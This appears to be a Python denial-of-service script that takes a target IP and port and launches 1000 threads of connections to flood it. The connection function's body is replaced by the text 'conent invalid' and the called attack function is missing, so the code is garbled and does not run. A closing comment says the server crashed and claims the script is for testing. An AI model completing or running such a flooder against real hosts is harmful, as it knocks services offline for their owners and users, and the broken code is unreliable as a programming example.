import socket  # Import socket module for network communication
import threading  # Import threading module to run multiple threads
import time  # Import time module for delays

# Function to create and connect a socket to the target
def make_socket(host, port):
  



  conent invalid 




  
# Main code block
if __name__ == "__main__":
    CONNECTIONS = 2000  # Number of connections each thread will manage
    THREADS = 1000  # Number of threads to run simultaneously
    # Get the target IP and port from the user
    host = input("Enter the target IP address: ")
    port = int(input("Enter the target port: "))
    
    # Create and start threads to perform the attack
    for x in range(THREADS):
        threading.Thread(target=attack, args=(host, port, x)).start()
        time.sleep(0.2)  # Small delay to avoid overloading the system
    
    input()  # Keeps the program running until user manually stops it
    #Script is executed and server is crashed we are using this script fo testing purposes
